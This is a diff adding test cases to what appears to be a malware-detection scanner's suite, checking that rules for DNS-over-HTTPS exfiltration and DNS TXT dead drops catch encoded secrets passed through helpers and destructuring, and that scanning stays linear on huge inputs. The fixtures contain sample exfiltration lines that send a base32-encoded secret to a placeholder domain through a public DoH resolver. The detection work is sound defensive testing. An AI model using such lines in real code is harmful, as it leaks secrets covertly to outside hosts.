@@ -104,6 +104,40 @@ describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", ()
     expect(severities("C2_DOH_RESOLVER", content)).toEqual(["low"]);
   });
 
+  it("follows the encoder through a helper function and a destructuring assignment", () => {
+    const helper = [
+      "function buildQuery() {",
+      '  return base32(secret) + ".x.example";',
+      "}",
+      'fetch("https://dns.google/resolve?name=" + buildQuery() + "&type=TXT");',
+    ].join("\n");
+    expect(severities("C2_DOH_RESOLVER", helper)).toEqual(["medium"]);
+    const destructured = [
+      "const [label] = [base32(secret)];",
+      'fetch("https://dns.google/resolve?name=" + label + ".x.example&type=TXT");',
+    ].join("\n");
+    expect(severities("C2_DOH_RESOLVER", destructured)).toEqual(["medium"]);
+  });
+
+  it("stays linear with many hits and long assignment chains above each", { timeout: performanceBudget(60_000) }, () => {
+    const block = (i: number): string => {
+      const chain = Array.from({ length: 200 }, (_, k) => (k === 0 ? `v${i}_0 = base32(x)` : `v${i}_${k} = v${i}_${k - 1}`)).join("; ");
+      return [chain, chain, chain, chain, chain, `fetch("https://dns.google/resolve?name=" + v${i}_199 + "&type=TXT");`].join("\n");
+    };
+    const content = Array.from({ length: 500 }, (_, i) => block(i)).join("\n");
+    const started = performance.now();
+    severities("C2_DOH_RESOLVER", content);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
+  });
+
+  it("stays linear on a long line of object-literal fragments", { timeout: performanceBudget(60_000) }, () => {
+    const fragments = "{eval: x".repeat(Math.ceil((5 * 1024 * 1024) / 8));
+    const content = ['const d = Buffer.from(r, "base64").toString();', fragments, "dns.resolveTxt(domain);"].join("\n");
+    const started = performance.now();
+    severities("DEAD_DROP_DNS_TXT", content);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
+  });
+
   it("does not count comparisons with eval or Function as a sink", () => {
     const content = [
       "if (handler === eval || typeof handler == Function) throw new Error(\"blocked\");",
